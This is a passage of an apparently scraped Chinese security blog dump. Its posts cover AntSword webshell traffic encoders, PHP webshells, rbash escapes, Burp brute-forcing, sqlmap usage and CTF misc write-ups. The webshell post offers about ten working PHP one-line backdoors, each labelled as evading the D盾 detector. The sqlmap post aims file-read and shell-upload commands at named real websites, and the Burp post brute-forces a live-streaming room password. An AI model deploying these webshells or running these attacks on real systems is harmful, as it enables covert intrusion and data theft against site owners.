+&#x3D; &#39;steady&#39;; &#125; ret[pwd] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;); ret[pwd] &#x3D; &#39;steady&#39; + ret[pwd]; ret[pwd] +&#x3D; &#39;steady&#39;; &#x2F;&#x2F; 返回编码器处理后的 payload 数组 return ret; ########## 请在下方编写你自己的代码 ###################&#125; 可以看到并没有对其他参数进行编码，而是向其他参数加入了一下自定义的字符串。 解码器蚁剑的编码器是编码或者加密蚁剑向服务端发送的请求包的，所以解码器是用来编码或者加密服务端返回给蚁剑的数据包的，编码后的数据包只有蚁剑能够解码。有些waf会检测返回包，所以有时也需要使用解码器。 使用编码器 使用base64，返回的数据被加密成base64。 不使用编码器 可以看到返回包是明文。 解码器分析12345678910111213141516171819202122232425262728/** * php::base64解码器 * Create at: 2020/05/22 10:21:48 */&#x27;use strict&#x27;;module.exports = &#123; /** * @returns &#123;string&#125; asenc 将返回数据base64编码 * 自定义输出函数名称必须为 asenc * 该函数使用的语法需要和shell保持一致 */ asoutput: () =&gt; &#123; return `function asenc($out)&#123; return @base64_encode($out); &#125; `.replace(/\\n\\s+/g, &#x27;&#x27;); &#125;, /** * 解码 Buffer * @param &#123;string&#125; data 要被解码的 Buffer * @returns &#123;string&#125; 解码后的 Buffer */ decode_buff: (data, ext=&#123;&#125;) =&gt; &#123; return Buffer.from(data.toString(), &#x27;base64&#x27;); &#125;&#125; 两个方法，asoutput及decode_buff。 asoutput无需传入参数，返回一段php代码字符串，名称为asenc的函数，这个函数会放在请求包里，用于在服务端执行完代码后，再回显部分调用该函数asenc来编码处理，所以服务端无需针对解码做改动。 自制编码器主要原理就是在返回的数据包中加入自己的随机字符。 1234567asoutput: () &#x3D;&gt; &#123; return &#96;function asenc($out)&#123; &#x2F;&#x2F;返回时添加一个随机字符串，避免被waf解码成功 return &#39;steady&#39;.@base64_encode($out); &#125; &#96;.replace(&#x2F;\\n\\s+&#x2F;g, &#39;&#39;);&#125;, 对称加密，非对称加密客户端免杀extract 变量覆盖过D盾1&lt;?php $a&#x3D;1;$b&#x3D;$_POST;extract($b);print_r(&#96;$a&#96;)?&gt; post数据a=命令 parse_str 变量覆盖过D盾1&lt;?php $a&#x3D;1;$b&#x3D;&quot;a&#x3D;&quot;.$_GET[&#39;a&#39;];parse_str($b);print_r(&#96;$a&#96;)?&gt; get数据a=命令 __destruct 析构函数过D盾1234567891011121314&lt;?php class User&#123; public $name &#x3D; &#39;&#39;; function __destruct()&#123; eval(&quot;$this-&gt;name&quot;); &#125;&#125;$user &#x3D; new User;$user-&gt;name &#x3D; &#39;&#39;.$_POST[&#39;name&#39;];?&gt; null 拼接过D盾123456789&lt;?php$name &#x3D; $_GET[&#39;name&#39;];$name1&#x3D;$name2&#x3D; null;eval($name1.$name2.$name);?&gt; ‘’ 拼接过D盾123456789&lt;?php$name &#x3D; $_GET[&#39;name&#39;];$name1&#x3D;$name2&#x3D; &#39;&#39;;eval($name1.$name2.$name);?&gt; ‘’ null 拼接过D盾123456&lt;?php$a &#x3D; $_GET[&#39;a&#39;];$c &#x3D; null;eval(&#39;&#39;.$c.$a);?&gt; array_map函数过D盾12345678910&lt;?phpfunction user()&#123;$a123 &#x3D; chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);return &#39;&#39;.$a123;&#125;$a123 &#x3D; user();$x123 &#x3D;array($_GET[&#39;x&#39;]);array_map($a123,$a123 &#x3D; $x123 );?&gt; call_user_func_array函数过D盾123456789&lt;?phpfunction a()&#123; return &#39;assert&#39;;&#125;$a&#x3D;a();$aa &#x3D; array($_GET[&#39;x&#39;]);call_user_func_array($a,$a&#x3D;$aa);?&gt; call_user_func函数过D盾12345678&lt;?phpfunction a()&#123; return &#39;assert&#39;;&#125;$a&#x3D;a();$aa&#x3D;$_GET[&#39;x&#39;];call_user_func($a,$a&#x3D;$aa);?&gt;","categories":[{"name":"By-pass","slug":"By-pass","permalink":"http://s1eady.top/categories/By-pass/"}],"tags":[{"name":"By-pass","slug":"By-pass","permalink":"http://s1eady.top/tags/By-pass/"}]},{"title":"渗透测试--Linux信息收集与提权","slug":"rbash绕过","date":"2019-08-12T04:30:22.000Z","updated":"2020-11-11T08:26:44.468Z","comments":true,"path":"2019/08/12/rbash绕过/","link":"","permalink":"http://s1eady.top/2019/08/12/rbash%E7%BB%95%E8%BF%87/","excerpt":"","text":"Rbash绕过什么是受限shell环境?受限shell环境，指的是一个会阻止/限制某些命令（如cd、ls、echo等）或”阻止”SHELL、PATH、USER等环境变量的shell环境。有些时候，受限shell环境可能会阻止重定向输出操作符如&gt;，&gt;&gt;，或者其他使用这些重定向的命令。 受限shell环境的目的 提高安全性 防止受到黑客/渗透测试人员的攻击。 有时，系统管理员会创建一个受限shell环境，来防止受到某些危险命令误操作所带来的伤害。 信息收集拿到一个受限制的shell之后，我们需要做的就是执行一些操作，来摸清当前shell的限制情况。 查看是否可以执行某些命令 1cd、ls、echo 检查操作符号 1&gt;、&gt;&gt;、&lt;、| 检查编程语言是否可以运行 1perl、ruby、python、php 查看我们能以root用户运行那些命令 1sudo -l 12345678910➜ ~ sudo -lPassword:Matching Defaults entries for apple on appledeMacBook-Pro: env_reset, env_keep+=BLOCKSIZE, env_keep+=&quot;COLORFGBG COLORTERM&quot;, env_keep+=__CF_USER_TEXT_ENCODING, env_keep+=&quot;CHARSET LANG LANGUAGE LC_ALL LC_COLLATE LC_CTYPE&quot;, env_keep+=&quot;LC_MESSAGES LC_MONETARY LC_NUMERIC LC_TIME&quot;, env_keep+=&quot;LINES COLUMNS&quot;, env_keep+=LSCOLORS, env_keep+=SSH_AUTH_SOCK, env_keep+=TZ, env_keep+=&quot;DISPLAY XAUTHORIZATION XAUTHORITY&quot;, env_keep+=&quot;EDITOR VISUAL&quot;, env_keep+=&quot;HOME MAIL&quot;, lecture_file=/etc/sudo_lectureUser apple may run the following commands on appledeMacBook-Pro: (ALL) ALL 检查具有SUID权限的文件或命令 检查当前所用的shell，具体命令为：echo $SHELL 。 12➜ blog echo $SHELL/bin/zsh 查看当前的环境变量 env或printenv命令 12345678➜ blog envTERM_SESSION_ID&#x3D;w1t0p0:A0B301BE-DD25-4605-BC9B-7B6F99E2BF38SSH_AUTH_SOCK&#x3D;&#x2F;private&#x2F;tmp&#x2F;com.apple.launchd.zvhBmnseo7&#x2F;ListenersLC_TERMINAL_VERSION&#x3D;3.3.9COLORFGBG&#x3D;15;0ITERM_PROFILE&#x3D;DefaultXPC_FLAGS&#x3D;0x0LANG&#x3D;zh_CN.UTF-8 绕过rbash编程语言绕过1234561) 使用 except &gt; except spawn sh，然后执行sh2) 使用 python &gt; python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;3) 使用 php &gt; php -a ，然后执行 exec(&quot;sh -i&quot;);4) 使用 perl &gt; perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;5) 使用 lua &gt; os.execute(&#39;&#x2F;bin&#x2F;sh&#39;).6) 使用 ruby &gt; exec &quot;&#x2F;bin&#x2F;sh&quot; 常见绕过技术1231）如果允许使用“&#x2F;”的话，则可以运行&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash。2）如果可以运行cp命令，则可以将&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash复制到自己的目录中。3) 使用 ftp &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash 12345678910111213144) 使用 gdb &gt; !/bin/sh 或者 !/bin/bash[steady@gongxinao ~]$ gdbGNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-119.el7Copyright (C) 2013 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-redhat-linux-gnu&quot;.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.(gdb) !/bin/shsh-4.2$ 12345675) 使用 more&#x2F;man&#x2F;less &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bashless 和 more阅读页面时候，也会进入命令模式，键入q则会直接退出，如果键入 !&#39;sh&#39; 则会进入一个shell。6) 使用 vim &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash 或者 set shell&#x3D;&#x2F;bin&#x2F;bash shellvi steady.txt 方法vi进入编辑器命令模式:!&#x2F;bin&#x2F;bash 输入&#x2F;bin&#x2F;bash7) 使用 rvim &gt; :python import os; os.system(&quot;&#x2F;bin&#x2F;bash )8) 使用 scp &gt; scp -S &#x2F;path&#x2F;yourscript x y: 12349) 使用 awk &gt; awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash&quot;)&#125;&#39;[steady@gongxinao ~]$ awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;sh-4.2$ awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;[steady@gongxinao ~]$ 110) 使用 find &gt; find &#x2F; -name test -exec &#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash \\; 其他技术12341)使用 ssh &gt; ssh username@IP - t &quot;&#x2F;bin&#x2F;sh&quot; 或者 &quot;&#x2F;bin&#x2F;bash&quot;2)使用 ssh2 &gt; ssh username@IP -t &quot;bash --noprofile&quot;3)使用 ssh3 &gt; ssh username@IP -t &quot;() &#123; :; &#125;; &#x2F;bin&#x2F;bash&quot; (shellshock)通过ssh链接当前IP的当前用户并启动&#x2F;bin&#x2F;bash，主要用到了ssh命令的t参数。 123454)使用 ssh4 &gt; ssh -o ProxyCommand&#x3D;&quot;sh -c &#x2F;tmp&#x2F;yourfile.sh&quot; 127.0.0.1 (SUID)5)使用 git &gt; git help status &gt; ，然后就可以运行 !&#x2F;bin&#x2F;bash了6)使用 pico &gt; pico -s &quot;&#x2F;bin&#x2F;bash&quot; ，然后就可以对 &#x2F;bin&#x2F;bash 执行写操作，最后执行 CTRL + T7)使用 zip &gt; zip &#x2F;tmp&#x2F;test.zip &#x2F;tmp&#x2F;test -T --unzip-command&#x3D;&quot;sh -c&#x2F;bin&#x2F;bash&quot;8)使用 tar &gt; tar cf &#x2F;dev&#x2F;null testfile --checkpoint&#x3D;1 --checkpointaction&#x3D;exec&#x3D;&#x2F;bin&#x2F;bash 设置环境变量查看当前用户是否对环境变量有写的权限。如果有w权限我们就可以修改。 12345declare -x PATH=&quot;/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/steady/.local/bin:/home/steady/bin&quot;declare -x PWD=&quot;/home/steady&quot;declare -x QT_IM_MODULE=&quot;ibus&quot;declare -x SESSION_MANAGER=&quot;local/unix:@/tmp/.ICE-unix/1942,unix/unix:/tmp/.ICE-unix/1942&quot;declare -x SHELL=&quot;/bin/bash&quot; 如果具有写入的权限，呢么我们可以把/bin/bash添加到环境变量$PATH中。$PATH是一个Linux的环境变量，用于命令搜索。 /bin是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。当时我们输入pwd的时候计算机首先去/bin中去查找，发现存在pwd命令，可以使用。 123BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;aexport PATH&#x3D;$PATH:&#x2F;binexport PATH&#x3D;$PATH:&#x2F;bin&#x2F;bash 所以我们在讲/bin/bash输入到PATH中，我们输入/bin/bash就会切换一个shell。进而达到了绕过rbash的目的。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"BurpSuit使用","slug":"Burp","date":"2019-07-08T09:22:43.000Z","updated":"2020-11-12T03:17:55.741Z","comments":true,"path":"2019/07/08/Burp/","link":"","permalink":"http://s1eady.top/2019/07/08/Burp/","excerpt":"","text":"Burp暴力破解功能Grep_Extract1、斗鱼直播间直播密码暴力破解 无论成功与否,返回包的数据长度和状态码都没有太大的区别 唯一区别就是返回内容中的 &#123;&quot;error&quot;:0,&quot;data&quot;:&#123;&quot;status&quot;:0&#125;&#125; 如果成功为status为1 我们可以看到返回包的长度和状态都是一样的无法区别暴力破解如果成功的话是什么状态. 这里我们使用到Grep_Extract选项—提取我们返回包中的内容,然后把选中的内容放在我们结果栏目中作为一列,供我们选择,而且我们也可以选在提取内容的最大长度,如图 如果我们选择 &#123;&quot;error&quot;:0,&quot;data&quot;:&#123;&quot;status&quot;:0&#125;&#125; 我们看到我们的选中内容出现在结果项中的某一列,这样我们就可以直接找到我们的有效载荷 Grep_Match这个功能与上者差不多,用于检测返回包中是否存在我们指定的特殊字符,只不过这种特殊字符我们可以自定义,而上者我们只能在返回包中选择 比如我们自定义&#123;&quot;status&quot;:1&#125; 然后爆破,可以看到会自动检测返回包中是否有该字符串,因为我们也可以添加各种具有代表性的字符,如果mysql数据库的关键报错信息等等 CSRFburp右键可以直接生成payload,一般所抓取的页面都会有明显的哈希参数 Collaborator Client对于平时测试中的一些盲问题，例如盲 xss，盲 xxe，盲 ssrf 等，如果不能看到一些回显信息，无法判断是否存在漏洞时，可以使用 burp 的 collaborator 来进行尝试。 命令执行Ping命令 Http请求 Makeinfo敏感信息检测对应的敏感信息会显示出来。 12345邮箱 -&gt; 黄色内网IP -&gt; 红色手机号码 -&gt; 绿色身份证号码 -&gt; 绿色其他 -&gt; 无 (只开启Unexpected information标签页)","categories":[{"name":"安全工具学习","slug":"安全工具学习","permalink":"http://s1eady.top/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"安全工具学习","slug":"安全工具学习","permalink":"http://s1eady.top/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"}]},{"title":"Sqlmap使用","slug":"sqlmap使用以及学习","date":"2019-07-08T09:22:43.000Z","updated":"2020-11-17T06:09:49.917Z","comments":true,"path":"2019/07/08/sqlmap使用以及学习/","link":"","permalink":"http://s1eady.top/2019/07/08/sqlmap%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"sqlmap使用以及学习sqlmap使用sqlmap快速查找敏感数据库、数据表、数据字段123--search -D：搜索某个数据库--search -T：搜索某个表名--search -C：搜索某个字段名 通过搜索形如username、password的字段即可快速定位重要数据表。 检测使用waf1sqlmap -u &quot;http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&quot; --identify-waf 1234567891011121314151617root@steady:~# sqlmap -u &quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&quot; --identify-waf ___ __H__ ___ ___[(]_____ ___ ___ &#123;1.4.9.5#dev&#125; |_ -| . [)] | .&#x27;| . | |___|_ [&#x27;]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [14:18:20] [WARNING] switch/option &#x27;--identify-waf&#x27; is deprecated (hint: functionality being done automatically)[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 14:18:20 /2020-11-10/[14:18:21] [INFO] testing connection to the target URLyou have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=r3ng6cf272b...decjvebtm2&#x27;). Do you want to use those [Y/n] y[14:18:26] [INFO] checking if the target is protected by some kind of WAF/IPS[14:18:27] [CRITICAL] WAF/IPS identified as &#x27;ModSecurity (Trustwave)&#x27; 可以看到检测到的waf为： 1WAF&#x2F;IPS identified as &#39;ModSecurity (Trustwave)&#39; 获取数据库版本、获取系统信息123-f: 检测数据库，服务器等（fingerprint）信息，-b或者--banner：获取数据库版本信息和数据库类型--batch:不与使用者进行信息交互，直接执行 指定使用的SQL注入技术1--technique T 12345B: Boolean-based blind SQL injection（布尔型注入）E: Error-based SQL injection（报错型注入）U: UNION query SQL injection（可联合查询注入）S: Stacked queries SQL injection（可多语句查询注入）T: Time-based blind SQL injection（基于时间延迟注入） 指定数据库类型1--dbms&#x3D;mysql 随机浏览器请求头1--random-agent 指定Get型参数1-p 参数 指定使用的脚本类型1–tamper&#x3D;&quot;&quot; 脚本类型randomcomments.py 12作用：用&#x2F;**&#x2F;分割sql关键字。Example：&#96;INSERT becomes &#39;IN&#x2F;&#x2F;S&#x2F;&#x2F;ERT&#39;。 指定延迟时间–delay=DELAY 1每次HTTP（S）请求之间延迟时间，值为浮点数，单位为秒，默认无延迟。 获取shell写入文件 12–file-write&#x3D;&quot;本地路径&quot; –file-dest&#x3D;&quot;远程路径&quot;–file-write&#x3D;&quot;&#x2F;home&#x2F;temp&#x2F;shell.php&quot; –file-dest&#x3D;&quot;C:\\web\\2.php&quot; 读取文件 1➜ ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; --file-read&#x3D;&quot;C:&#x2F;WINDOWS&#x2F;system32&#x2F;axperf.ini&quot; 使用案例1sqlmap -u &quot;http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&quot; --dbms&#x3D;mysql --random-agent -p ac01 –tamper&#x3D;&quot;randomcomments.py&quot; --delay&#x3D;5","categories":[{"name":"安全工具学习","slug":"安全工具学习","permalink":"http://s1eady.top/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"安全工具学习","slug":"安全工具学习","permalink":"http://s1eady.top/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"}]},{"title":"CTF-杂项刷题3","slug":"CTF-杂项刷题2","date":"2019-05-30T10:23:13.000Z","updated":"2020-11-15T10:00:32.716Z","comments":true,"path":"2019/05/30/CTF-杂项刷题2/","link":"","permalink":"http://s1eady.top/2019/05/30/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%982/","excerpt":"","text":"Buuctf杂项爬12steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted$ file &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;爬&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;爬: PDF document, version 1.7 pdf文件打开。图片背后有十六进制转化得到flag。 [WUSTCTF2020]girlfrienddtmf-decoder 123456789101112131415161718192021222324steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted$ dtmf2num &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;girlfriend.wavDTMF2NUM 0.1.1by Luigi Auriemmae-mail: aluigi@autistici.orgweb: aluigi.org- open &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;girlfriend.wav wave size 7466540 format tag 1 channels: 2 samples&#x2F;sec: 44100 avg&#x2F;bytes&#x2F;sec: 176400 block align: 4 bits: 16 samples: 3733270 bias adjust: 215 volume peaks: -12024 12025 normalize: 20742 resampling to: 8000hz- MF numbers: 47777777- DTMF numbers: 999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777 手机键盘。 ttl隐写。 123463 00111111127 01111111191 10111111255 11111111 每一个 TTL 只有前两位隐藏数据，每四个为一组，隐藏一个字节。 12345678910111213141516171819202122import binasciiwith open(&#x27;1.txt&#x27;,&#x27;r&#x27;) as fp: a=fp.readlines() p=[] for x in range(len(a)): p.append(int(a[x])) s=&#x27;&#x27; for i in p: if(i==63): b=&#x27;00&#x27; elif(i==127): b=&#x27;01&#x27; elif(i==191): b=&#x27;10&#x27; else: b=&#x27;11&#x27; s +=b# print(s)flag = &#x27;&#x27;for i in range(0,len(s),8): flag += chr(int(s[i:i+8],2))print(flag) 发现是一个压缩包。一键脚本。 12345678910111213141516171819# -*- encoding: utf-8 -*-import binasciidef Decrypt(): f = open(&#x27;t.txt&#x27;, &#x27;r&#x27;) fh = open(&#x27;flag.zip&#x27;, &#x27;wb&#x27;) binstring = &#x27;&#x27; hexstring = &#x27;&#x27; for num in f.readlines(): bins = &#x27;&#123;:08b&#125;&#x27;.format(int(num.strip())) binstring += bins[:2] f.close() for i in range(0, len(binstring), 8): hexstring += chr(int(binstring[i:i+8], 2)) fh.write(binascii.unhexlify(hexstring)) fh.close()if __name__ == &#x27;__main__&#x27;: print(&quot;Start...&quot;) Decrypt() print(&quot;Done!&quot;) 伪加密，循环base64解密。 123456789101112# -*- encoding: utf-8 -*-import base64def base64decode(): f = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;) flag = f.read() while b&#x27;flag&#x27; not in flag: flag = base64.b64decode(flag) print(flag)if __name__ == &#x27;__main__&#x27;: print(&quot;Start...&quot;) base64decode() print(&#x27;Done!&#x27;) 有大量的ICMP数据包，并且icmp数据包有data字段，直接wireshark提取。 1tshark -r out.pcap -T fields -e &quot;data&quot; &gt;flag.txt 发现txt中有大量重复的数据。 12424535441525424242d2d2d2d2d424547494e2043455254494649434154452d2d2d2d2d0a 每4行都是重复的。 1sort 1.txt | uniq &gt;&gt;2.txt python批量转十六进制。 12345678lines&#x3D;open(&#39;out.txt&#39;,&#39;rb&#39;).readlines()file&#x3D;open(&#39;old_file.txt&#39;,&#39;wb&#39;)i&#x3D;0for line in lines: if i%4&#x3D;&#x3D;0: file.write(line.strip().decode(&#39;hex&#39;)) i+&#x3D;1file.close() 像是十六进制，但是每行头上有$$START$$+。 1234567import base64lines=open(&#x27;old_file.txt&#x27;,&#x27;rb&#x27;).readlines()file=open(&#x27;new_file&#x27;,&#x27;wb&#x27;)result=&#x27;&#x27;for line in lines[1:-1]: result+=line[9:].strip()file.write(base64.b64decode(result)) 得到一个zip。一个gif。查看每一帧的间隔时间。 12345678910identify -verbose flag.gif | grep Delay Delay: 50x100 Delay: 50x100 Delay: 50x100 Delay: 20x100 Delay: 50x100 Delay: 20x100 Delay: 20x100 Delay: 66x100 Delay: 66x100 或者 1identify -format &quot;%s %T \\n&quot; flag.gif 把20改成0,50改成1 转下ascii。 [GUET-CTF2019]虚假的压缩包两个压缩包，一个未加密，一个真密码。伪加密解压出来是rsa题，解密得到密码–答案是5。解压真压缩包，拿到一张图片和一个文件，图片修改高度。提示^5。即把文件与5异或。 12345678f1 = open(&#x27;./cipher&#x27;,&#x27;r&#x27;)xor_data = f1.read()f1.close()dec_data = &quot;&quot;for i in xor_data: tmp = int(i,16) ^ 5 dec_data += hex(tmp)[2:]print(dec_data[:10]) 504b030414是个压缩包，保存为压缩包。打开之后发现是个word。改为doc。 拿到许多英文句子，直接搜索flag。发现flag被隐藏。直接改颜色。 easy misc掩码攻击拿到压缩包内容。 1234567891011121314151617181920212223242526a = dIWb = sSDc = adE d = jVfe = QW8f = SA=g = jBth = 5REi = tRQj = SPAk = 8DSl = XiEm = S8Sn = MkFo = T9pp = PS5q = E/Sr = -sds = SQWt = obWu = /WSv = SD9w = cw=x = ASDy = FTaz = AE7 词频分析。 1234567891011121314151617181920import refile = open(&#x27;./1.txt&#x27;)line = file.readlines()file.seek(0,0)file.close()result = &#123;&#125;for i in range(97,123): count = 0 for j in line: find_line = re.findall(chr(i),j) count += len(find_line) result[chr(i)] = countres = sorted(result.items(),key=lambda item:item[1],reverse=True)num = 1for x in res: print(&#x27;频数第&#123;0&#125;: &#x27;.format(num),x) num += 1 派大星的烦恼放入01edito，找到&quot;DD&quot;``DD``&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;``&quot;&quot;&quot;DD&quot;&quot;&quot;``DD&quot;DD&quot;``&quot;D&quot;``&quot;DDD&quot;``&quot;D&quot;``D``&quot;DD&quot;``&quot;&quot;&quot;&quot;``&quot;DD&quot;``&quot;D&quot;``&quot;&quot;``&quot;DD&quot;``D``&quot;D&quot;``DD&quot;&quot;&quot;``&quot;D&quot;``DD&quot;``&quot;D&quot;``&quot;``&quot;DD&quot;``&quot;&quot;&quot;``&quot;DDD&quot;``&quot;&quot;``&quot;D&quot;``DD&quot;&quot;``&quot;D&quot;``&quot;``&quot;DD&quot;``&quot;``&quot;D&quot;``&quot;DD&quot;``D``&quot;D&quot;``DD``&quot;&quot;&quot;DD&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;&quot;``D``&quot;&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;D&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;``D``&quot;&quot;&quot;DD&quot;&quot;&quot;``D&quot;DD&quot;``&quot;DD&quot;``&quot;``&quot;DD&quot;``D``&quot;D&quot;``&quot;DD&quot;``&quot;``&quot;D&quot;``DD&quot;``&quot;DD&quot;``&quot;DD&quot;``&quot;&quot;&quot;``&quot;DDD&quot;``&quot;DD&quot;``&quot;DD&quot;``&quot;``&quot;D&quot;``&quot;DD&quot;``&quot;。 D变1，”变成0。 12345678910def bin_to_str(s): return &#x27;&#x27;.join([chr(i) for i in [int(b, 2) for b in s.split(&#x27; &#x27;)]])a = &quot;01101100 00101100 00001100 01101100 10011100 10101100 00001100 10000110 10101100 00101100 10001100 00011100 00101100 01000110 00100110 10101100 01100110 10100110 01101100 01000110 01101100 10100110 10101100 01000110 00101100 11000110 10100110 00101100 11001100 00011100 11001100 01001100&quot;a = a.split(&#x27; &#x27;)flag=&#x27;&#x27;for i in a: test=i[::-1] flag+=bin_to_str(test) print flag [GKCTF2020]Harley Quinn使用dtmf2num，解密没成功。使用multimon-ng 123456789101112131415161718192021222324252627steady@steady:~$ multimon-ng -t wav -a dtmf /home/steady/桌面/steady/Heathens.wavmultimon-ng 1.1.9 (C) 1996/1997 by Tom Sailer HB9JNX/AE4WA (C) 2012-2020 by Elias OenalAvailable demodulators: POCSAG512 POCSAG1200 POCSAG2400 FLEX EAS UFSK1200 CLIPFSK FMSFSK AFSK1200 AFSK2400 AFSK2400_2 AFSK2400_3 HAPN4800 FSK9600 DTMF ZVEI1 ZVEI2 ZVEI3 DZVEI PZVEI EEA EIA CCIR MORSE_CW DUMPCSV X10 SCOPEEnabled demodulators: DTMFDTMF: #DTMF: 2DTMF: 2DTMF: 2DTMF: 8DTMF: 3DTMF: 4DTMF: 4DTMF: 4DTMF: 7DTMF: 7DTMF: 7DTMF: 7DTMF: 3DTMF: 8DTMF: 8DTMF: 6DTMF: 6DTMF: #sox WARN rate: rate clipped 2152 samples; decrease volume?sox WARN dither: dither clipped 1920 samples; decrease volume? 手机密码。 粽子的来历doc打不开，尝试修改某处为FF。打开在后行间距转化0或者1。 [BSidesSF2019]zippy12steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;media$ tcpxtract -f attachment.pcapngFound file of type &quot;zip&quot; in session [192.168.56.2:4244 -&gt; 192.168.56.104:23825], exporting to 00000000.zip [WUSTCTF2020]spaceclubtext文件空白，全选，每一行的长短对应一个二进制数字。长为1，断为0。最后转二进制。 [*CTF2019]otaku一个压缩包、一个word，打开word，打开隐藏文字。发现多了一下的文字。 1Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can&#39;t contact Violet now. She must be desperate to see me and I don&#39;t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted.&#x2F;&#x2F;最后可以看到明文攻击。 可以看到这时候CRC一样。可以进行明文攻击。拿到图片，lsb隐写。 1ctf&#123;vI0l3t_Ev3rg@RdeN&#125; [ACTF新生赛2020]music放入winhex中，发现大量的A1。将文件与A1进行异或。发现文件头0000001866747970，mp4文件格式。修改后缀，听音乐拿到flag。 voip数据包，voip：互联网协议语音（VoIP），也称为IP电话，简称电话。 点击播放流并播放即有声音读出flag：seccon{9001IVR} 读取电话音频。 [湖南省赛2019]Findme七张图，一张一张分析。 第一张，图片高度明显小，直接CRC爆破，拿到图片，发现高度可以了但是图片模糊了。 然后使用Stegsolve打开，在blue 2通道发现二维码。扫描拿到： 1ZmxhZ3s0X3 第二张图，binwalk分离，没有分离出来东西。strings查看，发现有txt字样。 1234567CRysCRys2&#x2F;998.txtjRysjRysjRys2&#x2F;999.txt 可以判定藏有压缩包。尝试搜搜常见的压缩包头部，比如zip、7z等等，但是都没有发现什么线索。直接搜索png尾部，49 45 4E 44 AE 42 60 82。发现后面的数据为37 7A 03 04。有点像zip的头部，直接修改504B。打开之后发现文件打不开，提示文件损坏。返回看看，发现zip中有7z字样，最后直接把所有的7z替换为PK。导出十六进制，然后放入notepad，把37 7A替换为50 4B。保存，还是不能打开最后直接使用winrar进行修复。解压拿到许多文件。解压对文件大小进行排序，发现618.txt在第一个直接打开发现You find it: 1RVcmVfc。 第三个图片。 chunk[0]-chunk[6]的每一个数据块的crc值都是可打印的Ascii字符。 12345a &#x3D; [0x33,0x52,0x6C,0x5A,0x33,0x30,0x3D]for i in a: print(chr(i),end&#x3D;&quot;&quot;)#运行结果：3RlZ30&#x3D; 第四个图片。 exiftool。 1234567891011121314151617181920212223242526steady@steady:~&#x2F;桌面&#x2F;steady$ exiftool 